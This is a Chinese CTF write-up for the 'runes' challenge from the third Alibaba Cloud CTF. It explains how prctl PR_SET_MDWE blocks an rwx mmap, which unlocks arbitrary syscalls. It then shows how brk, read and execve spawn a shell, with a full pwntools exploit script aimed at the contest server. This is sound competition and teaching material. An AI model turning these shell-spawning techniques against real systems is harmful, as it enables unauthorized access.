---
title: 第三届阿里云CTF - runes
date: 2025/02/24 23:11:00
updated: 2025/02/24 23:51:00
tags:
    - syscall
thumbnail: /assets/aliyunctf2025/banner.png
excerpt: 通过利用`prctl`的`PR_SET_MDWE`系统调用，禁止`mmap`分配可执行内存来击败恶龙，并通过`brk`和`execve`获取shell。
---

> Show me your runes.
>> hint:
>> * No intended vulnerability in the bzImage/kernel, please exploit the
>>   userspace chal binary.
>> * As the challenge's name implies, you need to focus on the `syscall`
>>   aka rune in this challenge. Find a way to **weaken the dark dragon's
>>   power** once your character becomes strong enough.
>> * All syscall numbers（系统调用号） used in the intended solution are
>>   under 200 and relatively well used.

{% note green fa-heart %}
本题由 *hkbin* 和 *haraniN* 和我一起合作解决！
{% endnote %}

## 文件属性

|属性  |值    |
|------|------|
|Arch  |amd64 |
|RELRO |Full  |
|Canary|on    |
|NX    |on    |
|PIE   |on    |
|strip |yes   |

## 解题思路

{% note blue fa-circle-info %}
题目是运行在虚拟机中的，内存256M，内核版本6.6。
{% endnote %}

`chal`实现了一个小游戏，基础等级是`1`，可以执行任意syscall，并且可以控制前三个参数，
但是这3个参数必须小于`等级*100`。小游戏中可以升级，但是不可能超过7，
而指针对应的无符号数非常大，看到如果打败dark dragon可以升级到`0x7ffffffffff`，
然后就可以输入指针了。为了打败dark dragon，需要把它的血量打到1，
也就是需要让预期的`mmap`调用失败，如果成功，人物血量会直接归零。

{% folding blue::mmap了什么 %}
程序向`memfd`中写入了一串shellcode，并通过`mmap`包含fd来将其映射到`rwx`内存中，
随后执行，反汇编后结果是：

```x86asm
mov    rax,rdi
sub    QWORD PTR [rax],0x1337c0d3
ret
```

而输入的地址rdi是`&hp`，hp会直接降到0以下，并被随后的代码归零。
{% endfolding %}

寻找符合条件的syscall，先筛掉所有包含指针的syscall，由于程序打开的 `memfd`
被dup到了`1023`，而等级不可能在正常情况下大于10，因此也无法关闭 `memfd` 。
如果使内存不足以分配0x1000大小的内存的话，也可以阻止mmap，但是256M实在难以企及，
就算`fork`，增加的内存也是沧海一粟。最后选择了`prctl`，在Linux 6.3加入了`PR_SET_MDWE`，
开启这个[security bit](https://man7.org/linux/man-pages/man2/pr_set_mdwe.2const.html)
后可以禁止mmap一段`?wx`的内存，并且不会影响到execve后的新程序。
在因此设置后就能成功升级，实现任意syscall调用。

{% note blue fa-boxes-packing %}
由于Arch Linux滚动更新的特性，我的内核保持最新，可以直接把`chal`拖出来在本地调试；
而一些使用Ubuntu的小伙伴，由于内核老，是没有这个特性的，在本地只能盲调。
{% endnote %}

剩下的问题是保护全开，没有泄露任何指针。可以通过`brk`调用申请堆内存，
在上面写数据。由于sh链接到了busybox，因此还需要设置argv。最后
`execve(“/bin/sh", {“sh", NULL}, NULL)` 拿shell。

{% note green fa-lightbulb %}
[官方wp](https://xz.aliyun.com/news/17029)中使用了`shmget + shmat`来申请一片内存。
{% endnote %}

## EXPLOIT

```python
from pwn import *
from pwnlib.constants.linux.amd64 import __NR_prctl, __NR_alarm, __NR_brk, __NR_read, __NR_execve
context.terminal = ['tmux','splitw','-h']
GOLD_TEXT = lambda x: f'\x1b[33m{x}\x1b[0m'
EXE = './chal'
SYS = constants

def payload(lo: int):
    global sh
    if lo:
        sh = process(EXE)
        if lo & 2:
            gdb.attach(sh)
    else:
        sh = remote('121.41.238.106', 42898)

    def init_name(name: str):
        info('Waiting for vm to boot')
        sh.sendlineafter(b'tell me your name', name.encode())
        info(f'Script by {name}')

    def attack_dragon(rax: int, rdi: int=0, rsi: int=0, rdx: int=0, tosend: bytes=None) -> int:
        sh.sendlineafter(b'Your Journey Continues', b'2')
        sh.sendlineafter(b'Invoke the Forbidden Runes', b'3')
        sh.sendlineafter(b'60 3 3 3', f"{int(rax)} {int(rdi)} {int(rsi)} {int(rdx)}".encode())
        if tosend:
            sleep(0.125)
            sh.send(tosend)
        if rax == __NR_execve:
            return
        sh.recvuntil(b'force answers:')
        sysret = int(sh.recvline())
        sh.sendlineafter(b'Impossible', b'1')
        return sysret

    init_name('hkbin & Rocket & haraniN')
    attack_dragon(__NR_prctl, 65, 1) # PR_SET_MDWE; PR_MDWE_REFUSE_EXEC_GAIN
    attack_dragon(__NR_alarm, 0)     # reset alarm timer
    brk = attack_dragon(__NR_brk, 0) # initial brk
    success(GOLD_TEXT(f"Get brk: {brk:#x}, try to extend 0x1000"))
    brk_top = attack_dragon(__NR_brk, brk + 0x1000)
    assert brk_top == brk + 0x1000, "failed to extend brk"
    sent = attack_dragon(__NR_read, 0, brk, 16, b'/bin/sh\0' + p64(brk + 5) + b'\n') # "/bin/sh" "sh" NULL
    assert sent == 16, "failed to send /bin/sh"
    info('Now try to open the shell')
    attack_dragon(__NR_execve, brk, brk + 8, 0) # execve("/bin/sh", {"sh", NULL}, NULL)

    sh.clean()
    sh.interactive()
    sh.close()
```

{% note default fa-flag %}
![flag](/assets/aliyunctf2025/runes.png)
{% endnote %}

## 参考

1. [PR_SET_MDWE(2const) — Linux manual page](https://man7.org/linux/man-pages/man2/pr_set_mdwe.2const.html)
2. [第三届阿里云CTF官方Writeup](https://xz.aliyun.com/news/17029)
